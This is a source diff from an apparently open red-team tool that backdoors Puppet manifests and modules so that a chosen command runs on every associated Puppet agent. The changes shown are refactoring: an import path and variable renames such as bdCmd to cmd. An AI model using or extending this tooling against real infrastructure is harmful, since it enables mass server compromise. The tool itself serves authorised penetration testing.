@@ -10,8 +10,8 @@ import (
 	"fmt"
 	"github.com/fatih/color"
 	"github.com/gobuffalo/packr/v2"
+	"github.com/l50/MOSE/pkg/moseutils"
 	"github.com/l50/goutils"
-	"github.com/master-of-servers/mose/pkg/moseutils"
 	"io/ioutil"
 	"log"
 	"os"
@@ -37,12 +37,12 @@ type Command struct {
 var (
 	a               = CreateAgent()
 	cleanup         bool
-	bdCmd           = a.BdCmd
+	cmd             = a.Cmd
 	msg             = color.Green
 	osTarget        = a.OsTarget
 	moduleName      = a.PayloadName
 	uploadFileName  = a.FileName
-	uploadFilePath  = a.FilePath
+	uploadFilePath  = a.RemoteUploadFilePath
 	cleanupFile     = a.CleanupFile
 	puppetBackupLoc = a.PuppetBackupLoc
 )
@@ -173,7 +173,7 @@ func generateModule(moduleManifest string, cmd string) bool {
 	puppetCommand := Command{
 		ClassName: moduleName,
 		CmdName:   "cmd",
-		Cmd:       bdCmd,
+		Cmd:       cmd,
 		FileName:  uploadFileName,
 		FilePath:  uploadFilePath,
 	}
@@ -363,9 +363,9 @@ func main() {
 			log.Fatal("Exiting...")
 		}
 
-		msg("Backdooring the %s manifest to run %s on all associated Puppet agents, please wait...", manifestLoc, bdCmd)
+		msg("Backdooring the %s manifest to run %s on all associated Puppet agents, please wait...", manifestLoc, cmd)
 		backdoorManifest(manifestLoc)
-		createModule(manifestLoc, moduleName, bdCmd)
+		createModule(manifestLoc, moduleName, cmd)
 		modules := getModules(getPuppetCodeLoc(manifestLoc) + "/modules")
 		log.Printf("Modules found: %q", modules)
 	}
